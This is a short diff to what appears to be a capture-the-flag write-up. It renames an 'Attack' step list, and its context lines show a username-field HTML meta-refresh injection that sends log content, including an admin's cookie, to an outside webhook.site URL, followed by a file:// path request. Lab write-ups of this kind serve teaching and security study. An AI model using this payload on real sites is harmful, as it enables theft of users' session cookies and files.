@@ -108,7 +108,7 @@ incorporate part of the log's content (admin's cookie included):
 ```
 
 ## Attack
-Steps:
+Six steps:
 + Login with username <code><html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=</code>.
 + Visit <code>https://instance_server/admin?view=file:///flag.html</code> (it's important that the <code>view</code> parameter contains a valid path (existent file),
 because otherwise an error will be triggered and the log's content resetted, deleting our previous input).
